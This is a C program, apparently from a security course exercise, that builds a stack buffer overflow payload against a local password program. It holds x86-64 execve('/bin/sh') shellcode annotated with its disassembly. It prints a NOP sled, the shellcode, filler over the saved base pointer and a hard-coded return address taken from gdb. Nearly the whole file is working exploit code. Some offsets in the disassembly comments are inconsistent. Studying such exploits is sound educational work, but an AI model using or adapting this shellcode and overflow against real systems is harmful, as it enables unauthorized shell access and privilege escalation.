#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* This code is the compiled version of shellcode.s:
 * Just compile it and take the bytes from `objdump -d shellcode` */
const char ourcode[] = {
/*0000000000400078 <_start>:
  400078:	eb 1f                	jmp    40009e <put_addr_on_stack> */
	"\xeb\x1f"

/*000000000040007a <prep_string>:
  40007a:	5b                   	pop    %rbx
  40007b:	48 31 c0             	xor    %rax,%rax
  40007e:	88 43 07             	mov    %al,0x7(%rbx)
  400081:	48 89 5b 08          	mov    %rbx,0x8(%rbx)
  400085:	48 89 43 10          	mov    %rax,0x10(%rbx) */
	"\x5b"
	"\x48\x31\xc0"
	"\x88\x43\x07"
	"\x48\x89\x5b\x08"
	"\x48\x89\x43\x10"

/*0000000000400089 <call_execve>:
  400089:	48 31 c0             	xor    %rax,%rax
  40008c:	b0 3b                	mov    $0x3b,%al
  40008e:	48 31 d2             	xor    %rdx,%rdx
  400091:	48 31 f6             	xor    %rsi,%rsi
  400094:   48 89 df                mov    %rbx,%rdi
  40009c:	0f 05                	syscall */
	"\x48\x31\xc0"
	"\xb0\x3b"
	"\x48\x31\xd2"
	"\x48\x31\xf6"
	"\x48\x89\xdf"
	"\x0f\x05"

/*000000000040009e <put_addr_on_stack>:
  40009e:	e8 dc ff ff ff       	callq  40007a <prep_string> */
	"\xe8\xdc\xff\xff\xff"
	// string
	"/bin/shN"
	"AAAAAAAA"
	"BBBBBBBB"
	"\x0"
};


int
main( void )
{
	const char *shellcode = ourcode;

	/* This is the address on the stack to where we want to jump:
	 * We get this address from gdb, simply &passwd. */
	const char *addr = { "\x40\xdf\xff\xff\xff\x7f\x00\x00" };

	/* This number of bytes is extracted from the disassembly of main:
	 * Just in the start the main function allocates the memory for local 
	 * variables by modifying %rsp. */
	size_t stack_size = 0x100;
	stack_size -= 0x80; // We don't care about newpass, it's "before" anyway
	stack_size -= strlen( shellcode );

	/* Start the outputs:
	 * It's easier to hit the right spot if we pad with NOPs first. Then we 
	 * want to hit the stored value for %ebp and finally the return pointer. */

	/* padding: NOPs */
	for ( size_t i = 0; i < stack_size; i++ )
		putchar( 0x90 );

	/* executable code */
	for ( size_t i = 0; i < strlen( shellcode ); i++ )
		putchar( shellcode[i] );

	/* Stored %rbp:
	 * We don't care, it'll never be used again anyway.  We only care that it's 
	 * 8 bytes on our system.  Check this with "x/100x $rsp" in gdb.  Look at 
	 * the addresses of "&passwd" and "$rbp". */
	for ( size_t i = 0; i < 8; i++ )
		putchar( 0x90 );

	/* return address */
	for ( size_t i = 0; i < strlen( addr ); i++ )
		putchar( addr[i] );

	return 0;
}
